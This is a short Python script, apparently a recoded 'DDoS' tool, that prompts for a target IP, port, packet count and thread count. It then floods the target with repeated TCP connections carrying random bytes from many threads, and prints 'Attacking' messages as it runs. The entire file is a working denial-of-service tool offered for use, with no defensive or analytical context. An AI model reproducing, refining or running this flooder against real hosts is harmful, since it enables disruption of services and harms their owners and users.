import os
import time
import socket
import threading
import random
import progressbar

os.system("clear")

print("""
   \033[91m.\033[97m__=\033[94m[\033[97m Recoded by \033[92mKevlog \033[94m]\033[97m=__\033[91m.
 \033[97m.--\033[94m[ \033[97mForked from HC-R.Code07 \033[94m]\033[97m--.\033[97m
""")
print("\033[97m ------------------------------")
print("\033[91m Fill in the target data first!")
ip = str(input("\033[92m [\033[97m+\033[92m] Target IP : "))
print("\033[97m ------------------------------")
port = int(input("\033[92m [\033[97m+\033[92m] Port : "))
print("\033[97m ------------------------------")
packs = int(input("\033[92m [\033[97m+\033[92m] Packets : "))
print("\033[97m ------------------------------")
thread = int(input("\033[92m [\033[97m+\033[92m] Threads : "))
print("\033[97m ------------------------------")
  
  
def animated_marker():
    widgets = [' \033[94m[\033[97m#\033[94m]\033[96m Loading : ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()
      
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
          
animated_marker()

def start():
  r = random._urandom(10)
  u = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(r)
      for i in range(packs):
        s.send(r)
        u += 1
        print(" \033[92m[\033[97m+\033[92m] \033[91mSent \033[96m: " +str(u)+ " \033[94m<-- Attacking " +ip+ " -->" )
    except:
      s.close()
      print(" \033[97m[\033[91m-\033[97m]\033[91m Flooding Done!")

for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()